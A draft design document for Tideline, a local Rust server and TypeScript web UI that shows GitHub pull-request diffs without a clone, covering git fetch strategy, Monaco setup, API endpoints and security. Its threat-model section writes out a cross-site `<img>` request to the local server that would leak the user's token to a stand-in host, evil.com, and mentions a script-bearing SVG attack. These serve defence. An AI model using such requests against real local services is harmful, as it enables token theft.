# Tideline Design Document

- Status: draft
- Date: 2026-10-12

## 1. Background and goals

Reading PR diffs on the GitHub website has these problems:

- It shows only the changed fragments (hunks). To see context, you have to click "expand" again and again.
- Big PRs lag, and large files are collapsed by default.
- The left and right panes don't stay in sync, and keyboard support is weak.
- After the author force-pushes, it is hard to see only "what changed since the last review".

The PR feature built into JetBrains IDEs works well, but you first have to clone the repo, open the project and wait for indexing to finish. That is too heavy.

**The goal in one sentence: no clone and no IDE. Give it a PR link and see an IDE-grade diff within seconds.**

Product form: a local command-line program (Rust) that starts a local HTTP server and opens a web UI (TypeScript) in the browser.
The server handles git operations, GitHub API calls and building the symbol index. The browser handles display and interaction.

## 2. Scope

### Milestones

| Milestone | Content |
|---|---|
| **M0 read diffs** | After you enter a PR link: changed-files tree; full-file diff (side-by-side / unified); collapsed unchanged regions; syntax highlighting; word-level highlighting; ignore leading/trailing whitespace; F7 jumps to the next change, across files; generated files collapsed by default; side-by-side image comparison |
| **M1 review context** | Viewed state synced both ways with GitHub; read-only display of existing review threads; view a single commit or a commit range; "what changed since the last review" (handles rebases) |
| **M2 code navigation** | tree-sitter symbol index; go to definition (Ctrl+B / Ctrl+click); find usages by symbol name (Alt+F7); sticky header showing the current function or class; file outline |

### Out of scope (during M0–M2)

- No write operations: inline comments, suggested changes, submitting reviews, approving. Do all of these on the GitHub website.
- No JetBrains-style curved connector bands. Monaco aligns the two sides by inserting blank lines. We accept that for this phase.
- No LSP, and no three-way merge view.
- Only GitHub and GitHub Enterprise; no other platforms. But all GitHub calls live in one module, so adding platforms later won't be too hard.
- No AI summaries.

## 3. User experience

### 3.1 Entry points

```bash
gh tideline https://github.com/owner/repo/pull/123   # as a gh extension
gh tideline owner/repo#123
gh tideline 123                                      # inside a repo directory; the repo is inferred from origin
gh tideline                                          # opens the home page: recently viewed PRs + an input box
```

- **Local URLs map one-to-one to GitHub paths:** `http://localhost:<PORT>/github.com/owner/repo/pull/123`.
  To open a GitHub link, just replace `https://` with `http://localhost:<PORT>/`.
  So a browser extension or bookmarklet needs only one line to implement "Open in tideline":

  ```js
  javascript:location.href='http://localhost:7457/'+location.host+location.pathname
  ```

- **Reuse a server that is already running.** If the server is already running, the CLI only opens the browser.
  How it checks: read `server.json`, then run a health check.

### 3.2 UI layout

```
+------------------------------------------------------------------------------+
| o/r #123  Add foo support   main <- feat/foo  [All commits v] [Split|Unified] |
+----------------------+-------------------------------------------------------+
| v src/               | src/foo/bar.rs                   change 2/5 [x Viewed]|
|   v foo/             |  +------------ base ------------+------- head -------+|
|     M bar.rs  +12 -3 |  | 10 fn a() {                  | 10 fn a() {        ||
|   * M baz.rs   +1 -1 |  | 11 -  old();                 | 11 +  new(x);      ||
|     A new.rs  +40    |  |  ... 48 unchanged lines ...                       ||
|   R old.rs -> x.rs   |  |  +- alice: why not reuse helper? -------------+   ||
| > Generated (2)      |  +------------------------------+--------------------+|
| Viewed 3/7 [###...]  |                                                       |
+----------------------+-------------------------------------------------------+
| F7 next change | Shift+F7 prev | Shift Shift find file | v toggle viewed      |
+------------------------------------------------------------------------------+
```

**Changed-files tree:**
- Grouped by directory. Colors and letters show the status: A added, M modified, D deleted, R renamed.
- Each file shows its added/deleted line counts, a viewed checkbox and its comment count.
- Files whose viewed state is DISMISSED (viewed, then changed again) are marked in a prominent color.
- Generated and vendored files go in their own group, collapsed by default.

**Only one file is shown at a time.** This matches JetBrains and differs from GitHub, which puts all files into one long page.
The benefit: the editor needs only one instance, which mostly removes the performance problems of big PRs.

### 3.3 Keyboard shortcuts

The defaults stay as close to JetBrains as possible, and they are configurable.

| Key | Action |
|---|---|
| F7 / Shift+F7 | Next / previous change. At the end of a file, it moves into the next file automatically. By default Monaco binds these two keys to its accessible diff viewer, so we must override them |
| Alt+↓ / Alt+↑ | Next / previous file. We don't use Alt+← / Alt+→, because those are the browser's back and forward, which we need below |
| Shift twice, Ctrl+P | Find a file by name and jump to it |
| v | Toggle the viewed state of the current file. Marking it as viewed also jumps to the next unviewed file |
| Ctrl+F | Search in the current file (built into Monaco) |
| Ctrl+B / Ctrl+click (M2) | Go to definition |
| Alt+F7 (M2) | Find usages. On Linux, GNOME and KDE grab this key (to move windows), so Ctrl+Alt+F7 is also provided |

**Notes:**
- Shortcuts that the browser itself reserves can't be intercepted, such as Ctrl+T, Ctrl+W, Ctrl+N and Ctrl+Shift+N.
  So JetBrains' Ctrl+Shift+N (find file by name) becomes double Shift or Ctrl+P.
- "Back to the previous location" uses the browser history directly: every jump calls `pushState`, so the browser's back / forward work.

## 4. Architecture

### 4.1 Overview

```
 gh tideline <pr>  ──start / reuse──▶  local server (Rust, 127.0.0.1:PORT)
                                ├─ git layer ──── runs git commands ──▶ cache repo (bare + partial + shallow)
                                ├─ GitHub layer ─ GraphQL / REST ──▶ api.github.com / GHE
                                ├─ index layer (M2) ─ tree-sitter-tags ──▶ SQLite
                                └─ HTTP: /api/*, /api/events (SSE), static assets (embedded in the binary)
                                          ▲
 browser single-page app (TS + React) ────┘
   changed-files tree | Monaco DiffEditor (single instance) | comment view zones | status bar
```

### 4.2 Tech stack

| Layer | Choice | Reason |
|---|---|---|
| HTTP | axum + tokio | Mainstream in the ecosystem |
| CLI arguments | clap | |
| GitHub | reqwest (rustls) + hand-written GraphQL queries + serde types | We use very few endpoints, so octocrab isn't worth adding |
| git | Run `git` commands with `tokio::process`; each repo keeps one long-running `git cat-file --batch` process to read blobs | Only the git CLI fully supports partial clone, fetching by OID and `merge-tree --merge-base`. Neither gix nor git2 can lazily fetch objects from the remote |
| Embedded frontend | rust-embed | The result is a single binary |
| Cache directory | directories | Follows the XDG spec |
| Opening the browser | webbrowser | |
| Index (M2) | tree-sitter + tree-sitter-tags + per-language grammar crates; stored with rusqlite | tags.scm is exactly what GitHub's "search-based code navigation" uses |
| Frontend | Vite + React + TS | |
| Editor | monaco-editor (bundled into the frontend, not loaded from a CDN) + @monaco-editor/react | Built-in side-by-side / unified views, collapsing of unchanged regions, word-level highlighting and view zones. It also lets us register a definition provider |
| Highlighting | shiki + @shikijs/monaco | Uses TextMate grammars, so highlighting quality matches VS Code and beats Monaco's built-in Monarch |
| Lists | @tanstack/react-virtual | The file tree must handle 3000 files |
| Request cache | @tanstack/react-query | |

**Required git version: at least 2.40**, because we need `merge-tree --merge-base` and `check-attr --source`.
This machine has 2.43. The program checks the version at startup. If it is too old, it exits with an error and a hint.

### 4.3 Rust modules

Start with a single crate; each item below is one module. Split it into a workspace later if it grows.

```
src/
  main.rs        CLI: parse input, start / reuse the server, open the browser
  server/        axum routes, security middleware, static assets, SSE
  git/           cache repo management, fetch, diff, cat-file process pool, one lock per repo
  github/        token lookup, GraphQL / REST client, ETag cache
  pr/            ties git and GitHub together: open a PR, file list, commits, changes since the last review
  index/  (M2)   symbol extraction with tree-sitter-tags, SQLite, definition and usage lookup
  config.rs      config file ~/.config/tideline/config.toml
web/             frontend project; rust-embed embeds its build output
```

### 4.4 Cache directory

```
$XDG_CACHE_HOME/tideline/
  server.json                          running server: pid, port, version
  repos/<host>/<owner>/<repo>.git      bare repo, partial clone + shallow
  state.sqlite                         local state: recently opened PRs, the head last viewed in this tool for each PR
  index.sqlite             (M2)        symbol index, keyed by blob OID
```

**Maintaining the cache repos:**
- Every fetched commit gets a ref: `refs/dr/<pr>/<sha>`.
  The refs let `gh tideline gc` evict the cache per PR. They also keep "the head at the last review" from being garbage-collected.
- Set `gc.auto=0`, so this tool controls when gc runs.

## 5. Data flow

### 5.1 Opening a PR (M0)

```
1. Parse the input into (host, owner, repo, number)

2. One GraphQL query fetches:
   - the PR's id, title, author, state, baseRefName / baseRefOid, headRefName / headRefOid
   - the logged-in user
   - files { path additions deletions changeType }: paginated, 100 per page
     With this, the file tree can show line counts before any blob is fetched
   (from M1 on, the same query also requests viewerViewedState for files)

3. Compute the merge-base, consistent with GitHub's three-dot diff:
   REST GET /repos/{o}/{r}/compare/{baseRefOid}...{headRefOid}?per_page=1, and take merge_base_commit.sha
   (pass per_page=1; without it the response also carries patches for up to 300 files, which is heavy for big PRs)
   (fallback on failure: deepen the shallow history, then run git merge-base locally)

4. Shallow-fetch the two commits, with only commits and trees:
   git fetch --depth=1 --filter=blob:none origin <merge_base> <head>

5. Get the file list first. This step needs no blobs:
   git diff-tree -r --raw -z --no-renames --no-abbrev <merge_base> <head>
   (use the plumbing command diff-tree with --no-abbrev: git diff --raw prints abbreviated OIDs even with -z,
    and abbreviated OIDs can't be fetched; plumbing commands also ignore user config such as diff.renames)

6. Batch-fetch, in one go, the blobs of all changed files plus the .gitattributes files in the head version:
   git -c fetch.negotiationAlgorithm=noop fetch origin --no-tags --no-write-fetch-head \
       --recurse-submodules=no --filter=blob:none --stdin   <<< list of full 40-character OIDs
   (tested: this is exactly the command git runs internally for missing objects in a partial clone, and it works on GitHub)

7. With the blobs present, compute renames and exact line counts locally:
   git diff-tree -r --raw -z -M --numstat --no-abbrev <merge_base> <head>
   (even without step 6, this command does one batched prefetch on its own; step 6 puts the timing of the fetch under our control)

8. Determine which files are generated:
   git check-attr --source=<head> -z --stdin linguist-generated linguist-vendored
   plus built-in rules: *.lock, package-lock.json, pnpm-lock.yaml, go.sum, *.min.js, etc.

9. Return the PR info and the file list; the frontend renders the file tree and opens the first file
```

- **UX goal:** as soon as step 5 finishes, push the file tree to the frontend so it shows up first. Line counts come from GraphQL at first.
  After steps 6–8 finish, push the completed renames, line counts and generated-file flags over SSE.
- **Why .gitattributes goes into step 6:** when `check-attr --source` finds a .gitattributes file missing, it fetches it in a separate round trip.
- **Fetches into the same repo must run serially.** Concurrent fetches into one repo conflict on `shallow.lock`, so each repo has one tokio Mutex.
- **PRs from forks need no special handling.** The head commit is also reachable under `refs/pull/N/head` in the base repo, so fetching by SHA works the same way.

### 5.2 File contents and diff computation

**The server only serves the raw bytes of blobs. Monaco computes the diff in its own Worker** (`diffAlgorithm: 'advanced'`, the same algorithm VS Code uses).

**How the frontend loads a file:**
- When a file opens, request the old and new blobs concurrently.
- Create one Monaco model per blob, with the URI `dr://<side>/<oid>/<path>`. The language comes from the file extension.
  The URI must include the side: when only the file mode changed (status T), both sides have the same OID and path. Without the side, `createModel` throws "model already exists".
- Manage models with an LRU of about 50 at most, and dispose the ones beyond that.
- When a file opens, prefetch the blobs of the next file.
- Save and restore the view state per file (`saveViewState` / `restoreViewState`), so switching back returns to the same position.

**Large-file degradation:**

| Condition | Handling |
|---|---|
| Larger than 1 MB | Turn off syntax highlighting |
| Larger than 5 MB, or more than 50,000 lines | Don't load automatically; show "点击加载" ("click to load") |
| Longest line over 10,000 characters (minified files) | Turn off highlighting and word-level diff |

Monaco also has two limits of its own that must line up with the table above: `maxComputationTime` (default 5000 ms) and `maxFileSize` (default 50 MB).
When the diff computation times out, the result looks bad, so files above the thresholds in the table never go to Monaco for diffing.

**Line endings and encoding:**
- Monaco normalizes each model to a single line ending. If the only change is CRLF to LF, Monaco shows "no changes", while numstat counts every line as changed.
- So the server detects line-ending changes, BOMs, and UTF-16 or other non-UTF-8 encodings. When it finds one, the UI shows a notice at the top of the file.

**Binary files:**
- A file that numstat shows as `-	-` is binary.
- Images: the frontend `fetch`es the bytes, creates a `blob:` URL and compares the two sides with `<img>`. It doesn't use the blob endpoint URL directly as the img src. Section 8 explains why.
- Other binary files: show only "二进制文件，大小 a → b" ("binary file, size a → b").

**Ignoring whitespace:** Monaco only supports `ignoreTrimWhitespace` (ignore leading/trailing whitespace), so M0 offers only two settings: "don't ignore" and "ignore leading/trailing whitespace".
"Ignore all whitespace" would require our own diff computation. That is left for later.

**Line counts in the file tree** come from git numstat and may differ slightly from what the Monaco view shows. This is acceptable.

### 5.3 Viewed state sync (M1)

- **Read:** `pullRequest.files(first:100, after:$cursor) { nodes { path viewerViewedState } }`. There are three states: VIEWED, UNVIEWED and DISMISSED.
- **Write:** `markFileAsViewed(input:{pullRequestId, path})`; to undo, use `unmarkFileAsViewed`. Renamed files use the new path.
- **The frontend updates the UI first, then sends the request.** If the request fails, it rolls back and shows a toast.
- **Record the local head:** after the user marks every checkable file (generated files excluded) as viewed in this tool, store the current head SHA in `state.sqlite`. 5.6 uses it as the fallback baseline. Recording the head after marking just one file would be wrong.

### 5.4 Review thread display (M1, read-only)

- **Query:**
  `reviewThreads(first:100) { nodes { id isResolved isOutdated path subjectType line startLine diffSide comments(first:50) { nodes { author{login} bodyHTML createdAt url } } } }`
  Both levels, threads and comments, need pagination.
- **When to show them:** only when viewing the full PR range (merge-base → head).
  - Threads that are not outdated: insert them as a view zone below the matching line, based on `diffSide` (LEFT is the old file, RIGHT is the new file) and `line`.
  - Outdated threads and resolved threads: list them in the sidebar, collapsed by default.
  - File-level comments (`subjectType: FILE`) have no line number. Their `line` is null even when they are not outdated. Show them at the top of the file.
  - If a commented line falls in a region that `hideUnchangedRegions` has collapsed, its view zone is invisible. These lines must be force-expanded.
  - The implementation details (where LEFT threads go in unified mode, keeping cards from scrolling horizontally with the code, the order of forced expansion) were settled by the S8 spike results.
- **Line numbers can be used directly.** GitHub's `line` is the line number in the whole file. It matches our full-file models, so no conversion is needed.
- **Security:** `bodyHTML` is already rendered by GitHub, but we still sanitize it with DOMPurify.

### 5.5 Viewing by commit or range (M1)

- **Getting the commit list:** GraphQL `commits(first:100) { nodes { commit { oid messageHeadline authoredDate author{name} parents(first:2){nodes{oid}} } } }`.
  GitHub's REST list of PR commits returns at most 250 entries. Whether GraphQL `commits` has the same limit must be tested (see S7).
- **Fetching:** shallow-fetch all of the PR's commits and their parents by SHA in one go (depth=1, blob:none).
  No history walk is needed, because the diff of any range is just a comparison between two trees.
- **Selector:**
  - Single commit: parent → that commit. For a merge commit, use the first parent.
  - Range [A..B]: A's parent → B.
  - The state lives in the URL: `?from=<sha>&to=<sha>`.

### 5.6 What changed since the last review (M1)

**This is the key feature that sets us apart from the GitHub website.**

**1. Determine the baseline (the old head, called H_old):** use the first source available, in this order.
  1. The `commit.oid` of the current user's most recent review on this PR.
     Query: `reviews(last:20, author:$viewerLogin, states:[APPROVED, CHANGES_REQUESTED, COMMENTED, DISMISSED])`, and take the first review, from newest to oldest, that is not reply-only.
     `states` is required: without it, the query may return a PENDING review that the user hasn't submitted yet. That review sits on the current head, so the resulting diff is empty.
     Reply-only reviews must also be skipped: if the user only adds a reply in a thread after a push, GitHub still creates a COMMENTED review with an empty body and a commit equal to the new head.
  2. The head that this tool last saw, as recorded in `state.sqlite`.

**2. Fetch H_old and compute its merge-base (called M_old).**
- **How to compute M_old:** compare `{current baseRefOid}...{H_old}`.
  - If the PR's target branch changed midway, or the base branch itself was force-pushed, the value computed this way is unreliable. In that case, go straight to the fallback in the "conflict" row.
- **Fetching H_old:** tested: commits from before a force-push can still be fetched by SHA, as long as GitHub hasn't garbage-collected them yet.
- **When the fetch fails:** only the local cache can help (versions viewed earlier are protected by refs; see 4.4).
  If the cache doesn't have it either, show "上次 review 的版本已不可用" ("the last reviewed version is no longer available").
  Don't fall back to REST `git/trees` / `git/blobs`: they read the same object store, so when git can't fetch an object, they return 404 too.

**3. Compute the diff to show:**

| Case | Approach |
|---|---|
| `M_old == M_new` (no rebase) | Compare H_old → H_new directly |
| A rebase happened | First replay the old PR onto the new base: `T = git merge-tree --write-tree --merge-base=M_old M_new H_old`. If there is no conflict, show T → H_new. This leaves only the author's own changes, with no changes from the base branch mixed in |
| The replay has conflicts | Fall back to H_old → H_new, and show "包含 base 分支的变化" ("includes changes from the base branch") at the top |

**4. UI:** add an entry "Since your last review (abc1234)" to the commit selector.

### 5.7 Symbol index and code navigation (M2)

**When to build the index:** when the user first requests go to definition, or after the user turns on "自动建索引" ("build index automatically") in settings. The index builds in the background, and the server pushes progress to the frontend over SSE.

**Steps to build the index:**
1. `git ls-tree -r -z --long <head>` lists all files in the head version.
2. Filter by extension to the supported languages, and keep only files of 1 MB or less.
3. Batch-fetch these blobs in one go, with the method from step 6 of 5.1.
4. Read them one by one through `cat-file --batch`, and extract symbols with tree-sitter-tags.

**The index is keyed by blob OID, not by commit.** Files with the same content have the same OID.
So when the same repo moves to another head or another PR, only the new blobs need processing, and the increment is small.

**Schema:**
```sql
tags(blob_oid, name, kind, is_definition, start_line, start_col, end_line, end_col)
tree_entries(commit_oid, path, blob_oid)
```

**Where it is used:**

| Feature | Approach |
|---|---|
| File outline / sticky current function at the top | Convert the definition tags of the file into a Monaco `DocumentSymbolProvider` |
| Go to definition | Register a Monaco `DefinitionProvider` that asks the server for definitions by `name` and language. Ranking: same file > same directory > others. If the target file is in this PR, open its diff and go to the line. If not, open the head version in a read-only plain editor |
| Find usages | Query the tags with the same name and `is_definition = false` (`@reference.*` in tags.scm), and list them in the sidebar. The results are approximate, so the UI must say "按名称匹配" ("matched by name") |

**Scope:**
- By default, index only the head version. When the user requests a jump on the old file (left side), index the merge-base version on demand.
- First supported languages: Rust, Go, Python, TypeScript/TSX, JavaScript, Java, C, C++. All eight grammars include a tags.scm, and their Rust crates all export `TAGS_QUERY`.
  - The TypeScript tags.scm covers only TS-specific syntax. It must be combined with the JavaScript tags.scm.
  - The C and C++ tags.scm files have only definitions, no references. Find usages needs our own reference queries. Until then, it returns nothing for C/C++.
- tree-sitter reports columns as byte offsets, but Monaco expects UTF-16 columns, so they need conversion.

## 6. HTTP API

All endpoints start with `/api/{host}/{owner}/{repo}`. The table below omits this prefix.

| Method | Path | Description | Milestone |
|---|---|---|---|
| GET | `/pulls/{n}` | PR info: title, author, state, base and head, merge-base, node id | M0 |
| GET | `/pulls/{n}/files?from=&to=` | File list, with the `ChangedFile` shape below. Without parameters, it covers the full PR range | M0 |
| GET | `/blobs/{oid}` | Raw file bytes, with `Cache-Control: immutable` | M0 |
| GET | `/pulls/{n}/commits` | Commit list | M1 |
| GET | `/pulls/{n}/threads` | Review threads | M1 |
| PUT | `/pulls/{n}/viewed` | Request body `{path, viewed, head}`. Returns 409 `stale_head` when `head` is not the current head | M1 |
| GET | `/pulls/{n}/since-review` | Returns `{from, to, mode: direct \| rebased \| fallback, baseline}` | M1 |
| GET | `/revs/{sha}/symbols?path=` | Symbols of one file | M2 |
| GET | `/revs/{sha}/definitions?name=&lang=` | Find definitions | M2 |
| GET | `/revs/{sha}/references?name=&lang=` | Find usages | M2 |
| GET | `/api/events` | SSE push: fetch progress, index progress, file list completion | M0 |

```ts
interface ChangedFile {
  path: string;
  oldPath?: string;                       // only for renames and copies
  status: "A" | "M" | "D" | "R" | "C" | "T";
  oldOid: string | null;
  newOid: string | null;
  oldMode: string;
  newMode: string;
  additions?: number;                     // absent until numstat fills it in
  deletions?: number;
  binary: boolean;
  generated: boolean;
  viewed?: "VIEWED" | "UNVIEWED" | "DISMISSED";
}
```

## 7. Frontend notes

**Routes:**
- `/`: recently viewed PRs, plus an input box.
- `/{host}/{owner}/{repo}/pull/{n}?file=&from=&to=`: view a PR.

**DiffEditor options:**

```ts
{
  readOnly: true,
  renderSideBySide: true,
  hideUnchangedRegions: { enabled: true },
  ignoreTrimWhitespace: false,   // defaults to true; must be turned off explicitly
  diffAlgorithm: "advanced",
  renderOverviewRuler: true,
  experimental: { showMoves: true },   // move detection
}
```

**Loading Monaco:**
- Use `loader.config({ monaco })` to load the bundled monaco-editor instead.
  By default, `@monaco-editor/react` loads Monaco from the jsdelivr CDN.
- In Vite, also set `self.MonacoEnvironment.getWorker`.
  Otherwise the diff computation falls back to the main thread, and large files freeze the UI.

**F7 navigation:**
- First override Monaco's built-in F7 / Shift+F7 bindings (by default `AccessibleDiffViewerNext/Prev`).
- After `onDidUpdateDiff`, read `getLineChanges()` and implement the jump ourselves.
- When already at the last change, open the next file, wait for its diff to finish, then go to its first change.

**State management:** React Query caches server data. UI state (current file, view mode, ignore whitespace) lives in the URL and in localStorage.

## 8. Security

The local server holds a GitHub token and has a write endpoint (marking files as viewed). So it must stop other web pages from reaching it through the user's browser.

- **Listen only on 127.0.0.1.**
- **The host in the path must be on the allowlist (the most important rule):**
  - Allow only github.com and the GHE hosts listed explicitly in the config file.
  - Otherwise, any web page could include `<img src="http://localhost:PORT/api/evil.com/...">`, and the server would send requests to evil.com with the user's token: both API requests and git's http.extraHeader carry the token.
  - The same hole could also be used for SSRF, or to make the server fetch arbitrary repos and fill the disk.
- **Pick the token by host, with the same rules as gh:**
  - github.com: use `GH_TOKEN`, `GITHUB_TOKEN`.
  - GHE: use `GH_ENTERPRISE_TOKEN`, `GITHUB_ENTERPRISE_TOKEN`.
  - If none is set, use `gh auth token --hostname <host>`.
- **GET requests that trigger fetches must also be same-origin:** check `Sec-Fetch-Site: same-origin`, or require the `X-DR` header.
- **Local secret:**
  - Other processes and other users on the machine can also connect to 127.0.0.1:PORT, so `/api/*` requires a secret generated per installation.
  - When the CLI opens the browser, it uses a one-time URL that writes the secret into an HttpOnly, SameSite=Strict cookie.
  - If a page opened from a bookmark or a browser extension doesn't have this cookie yet, tell the user to run `gh tideline` once first.
- **Check the Host header:** accept only `localhost:PORT` and `127.0.0.1:PORT`, to prevent DNS rebinding.
- **Return no CORS headers:** requests from other sites can't read the response body.
- **Run two checks on non-GET requests:**
  - `Origin` must match this server;
  - the custom header `X-DR: 1` is required. A cross-origin request with a custom header sends a preflight request first, and the server simply rejects the preflight.
- **The token stays on the server and is never sent to the frontend.**
  - For git, inject `http.extraHeader` through the `GIT_CONFIG_COUNT/KEY/VALUE` environment variables.
  - Don't put it in command-line arguments, because `ps` shows command-line arguments.
- **Responses from `/blobs/{oid}` always use these headers:**
  - `Content-Type: application/octet-stream`
  - `X-Content-Type-Options: nosniff`
  - `Content-Security-Policy: sandbox`

  Otherwise, when someone opens a malicious SVG from a PR directly, it runs script on this server's origin and then calls the write endpoint as a same-origin caller.
- **Sanitize comment `bodyHTML` with DOMPurify before displaying it.**
- **When no token is available:** fail with an error and tell the user to run `gh auth login`.

## 9. Performance targets

These are all preliminary numbers. We will measure them during the spikes.

| Scenario | Target |
|---|---|
| Medium PR (up to 100 files), repo already cached: from running the command to seeing the file tree | Under 1 second |
| Same as above, first open of a large repo | Under 5 seconds (depends on the network; see S1) |
| Switching files (blobs already cached) | Under 100 milliseconds |
| Scrolling the file tree of a 3000-file PR | Smooth, no dropped frames |
| Resident memory of the server (excluding the index) | Under 100 MB |

## 10. Risks and spike list

Before writing M0, run a minimal spike for each item, one at a time.

During review, the following points were already tested on the cli/cli repo:
- Shallow-fetching commits by SHA: 1.7 seconds;
- Batch-fetching 21 blobs with `fetch --stdin`: 1.2 seconds;
- Old commits from before a force-push can still be fetched by SHA;
- In a shallow + partial repo, `merge-tree` and `diff -M` each do a single batched prefetch, with no lazy fetching of objects one at a time.

| ID | What to verify | How to verify | Fallback if it fails |
|---|---|---|---|
| S1 | The functionality is confirmed. Two points remain: ① speed on large repos; ② whether `http.extraHeader` for git over HTTPS should use `Bearer <token>` or `Basic base64(x-access-token:<token>)` | On real PRs from microsoft/vscode and torvalds/linux, measure the time from a cold start to seeing the file tree; try each auth header once | Switch to a blob:none partial clone with full history |
| S2 | Confirmed (M1 phase 0): cli/cli commits that were force-pushed away in 2020 can still be fetched by SHA today. For a commit that doesn't exist, `git fetch` reports `upload-pack: not our ref` and `compare` returns 404 | — | Use only the local cache; otherwise report that the version is unavailable |
| S3 | With a single Monaco instance and a model LRU, how much memory does a 1000-file PR take and how long does switching files take; how well does `hideUnchangedRegions` work | Build a prototype page and measure | Tune the LRU size, or switch to the CodeMirror 6 merge view |
| S4 | Confirmed: it works, with a single batched prefetch. No further checks needed | — | — |
| S5 | For a 3000-file PR, how much rate limit does GraphQL pagination (30 pages) consume | Read the rateLimit field in the responses | Use conditional requests with ETags, and cache the results |
| S6 (M2) | Does sticky scroll in DiffEditor use our custom DocumentSymbolProvider | Build a prototype and test | Draw our own bar at the top that shows the function or class name |
| S7 | Confirmed (M1 phase 0): GraphQL, like REST, returns at most 250 commits, namely the latest 250 that end at head. `totalCount` is the real total | — | Show a notice in the UI when the limit is exceeded |
| S8 | Confirmed (M1 phase 0, Monaco 0.57): view zones align on both sides automatically; only `setSelections` on the new-file editor reliably expands collapsed regions; in unified mode, zones can't be placed on the original-file side; cards stay put when the code scrolls horizontally only if they use a view zone plus an overlay widget; the production build works under the CSP response header | — | Approaches already in place |
| S10 | Confirmed (M1 phase 0): gh's OAuth token (`repo` scope) can call `markFileAsViewed` / `unmarkFileAsViewed`. A path that is not in the PR returns `UNPROCESSABLE`. After a push, viewed files that the push changed become DISMISSED. Fine-grained PATs are untested | — | Map permission errors to `github_error`; the UI rolls back and shows a toast |

## 11. Open questions

- **Binary name:** tentatively `gh-tideline`. That way it can run as a gh extension via `gh tideline`, and also standalone.
- **Default port:** browser extensions and bookmarks need a fixed port. Tentatively a fixed, configurable port, such as 7457.
- **How the server runs:** exit automatically after N idle minutes, or run all the time as a systemd user service? The former costs less. The latter keeps the browser extension usable at any time.
- **Cache eviction:** provide a `gh tideline gc` command that evicts the least recently used entries based on cache size. But "the head at the last review" must be kept.
- **Curved connector bands:** after M2, should we draw our own layer on top of Monaco to get JetBrains-style curved connector bands?
